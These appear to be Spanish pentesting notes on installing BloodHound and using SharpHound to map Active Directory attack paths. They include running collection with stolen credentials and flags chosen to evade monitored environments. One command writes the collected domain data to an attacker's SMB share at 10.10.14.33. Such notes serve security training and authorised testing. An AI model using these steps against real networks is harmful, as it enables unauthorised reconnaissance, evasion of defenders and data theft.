# Info

Bloodhound es una herramienta capaz de enumerar entornos de AD y Azure que, por medio de una interfaz, presenta los resultados de manera gráfica.

Utiliza una DB NoSQL para guardar los resultados y los presenta con un Graph data model

BloodHound muestra la información mediante **nodes** y **edges**. Los nodos son las OU, los edges son las relaciones que tiene una OU con otra.

# Instalación

Se requiere:

- Java 
- Neo4j

1) Agregamos el repo de java al source list

        echo "deb http://httpredir.debian.org/debian stretch-backports main" | sudo tee -a /etc/apt/sources.list.d/stretch-backports.list

2) Descargamos la key para el repo de neo4J

        wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -

3) agregamos el repo al sourcelist

        echo 'deb https://debian.neo4j.com stable 4.4' | sudo tee -a /etc/apt/sources.list.d/neo4j.list

4) Instalamos los paquetes requeridos

        sudo apt-get install apt-transport-https

5) instalamos neo4j

        sudo apt install neo4j

6) descargamos la última versión de bloodhound

        https://github.com/BloodHoundAD/BloodHound/releases
7) Descomprimimos fichero

        unzip BloodHound-linux-x64.zip && cd BloodHound-linux-x64/

8) lo corremos

        ./BloodHound --no-sandbox

# Uso

Iniciamos el neo4j con:

        sudo systemctl start neo4j

## COnfiguración del primer uso

Una vez iniciado el proceso, vamos al servicio iniciado en el localhost e iniciamos sesión con el user y pass neo4j

        http://localhost:7474/

Reestablecemos la contraseña.

## Recolección de información

Para recolectar información en los entornos de windows usamos SharpHound.

##### Modos de recolección:

| Metodo | desc |
|---|---|
|All | Busca todo lo que esté dentro del dominio menos los GPOLocalGroup |
|DCOnly | Colecta data solamente del DC sin preguntar al resto de los dispositivos domain-joined. Va a traer: Users, computadoras, security groups memberships, domain trusts, privilegios abusables dentro de los objetos. Entre otras cosas |
|Computer Only | Va a colectar información solamente de los equipos domain-joined |

        .\SharpHound.exe -c <metodo>


### Impersonación con SharpHound

Si conseguimos credenciales de otro usuario, podemos utilizarlo mediante las flags --ldapusername --ldappassword 

### Atacar un dominio en específico

SharpHound utiliza el dominio en el que nos encontramos por defecto, pero de haber multiples dominios en el Forest podríamos hacerlo indicando la flag -d y el dominio

        .\SharpHound.exe -c All -d <dominio>

### Entornos monitorizados

En un escenario donde el entorno se encuentra monitorizado, deberíamos realizar dos recolecciones con SHarpHound.

Primero realizamos una de tipo DCOnly, luego analizamos los resultados buscando computadoras que sean interesantes, creamos una lista de las mismas y luego corremos una computerOnly agregando la flag --computerfile y el file creado de las computadoras

        .\SharpHound.exe -c ComputerOnly --computerfile <file>

Se sabe que SharpHound, por defecto, genera distintos .json, que luego guarda en un zip. También genera un archivo con un nombre aleatorio y un .bin que corresponde a la caché de las consultas que realizas. Los equipos de defensa podrían utilizar estos patrones para detectar a Bloodhound. Una forma de intentar ocultar estos rastros es combinando algunas de estas opciones:

| Flag | Desc |
|---|---|
|--memcache | mantiene la caché en moria y no escribe en disco |
|--randomfilenames | Genera nombres de archivos aleatorios incluido el zip (modifica también la extención)|
|--outputprefix | Pone un prefijo a los archivos generados |
|--outputdirectory | señala el directorio en el que se guardarán los archivos |
|--zipfilename | nombra al zip final |
|--zippassword | da una contraseña al password |

Podríamos entonces levantar un smb y enviar el resultado de bloodhound al mismo

        SharpHound.exe --memcache --outputdirectory \\10.10.14.33\share\ --zippassword <pass> --outputprefix <pref> --randomfilenames

**<u>Atención:</u> **

Si el archivo que guardamos tiene password vamos a tener que descomprimirlo y luego enviar los archivos resultantes a bloodhound. Si no tiene password, indiferentemente de la extención del mismo, podemos sumarlo a bloodhound.

### Searchbar

La searchbar de Bloodhound nos permite traer información de las OU dentro del Domain.

Podemos también utilizar la funcionalidad de PathFinding (el primer boton del lado derecho de la search bar) para buscar paths de ataque entre dos nodos y utilizar la opción de filtros (el último boton) para indicar qué acciones no debe contemplar.


### El gráfico

Una vez cargada la información recogida, bloodhound nos presentará el gráfico.

En el mismo se mostrarán los nodos y edges

Si hacemos click en un nodo se nos desplegará la **info tab** debajo de la searchtab, si hacemos click derecho sobre el mismo tendremos una serie de opciones:

|Opción | Desc |
|----|-----|
|Set as Starting Node | Setea el nodo como el starting point del pathfinding |
|Set as Ending Node | Setea el nodo como el target en el pathfinding |
|Shortest paths to here | Va a buscar todos los caminos fáciles desde los distintos nodos hasta el nodo seleccionado (esto tarda mucho tiempo) |
| Shortest Paths to here from owned | Busca los vectores de ataque desde los nodos que tenemos como owned hasta el nodo seleccionado |
| Edit Node | Permite modificar las propiedades del nodo|
|Mark group as owned | Cambia el estado del nodo en la base de datos como owned, permitiendo nuevos shortpaths |
| Mark/Unmark Group as High Value | Marca o desmarca un nodo como de gran valor. Podemos aprivechar esto para buscar vectores de ataque usando la query "shortest paths to high-value assets" |
|Delete node | elimina un nodo de la base de datos |


Lo mismo pasa con los Edges, si hacemos click derecho sobre los mismos tendremos dos opciones:

- Help - Abrirá un popup con tres opciones:
        + Info
        + Abuse info

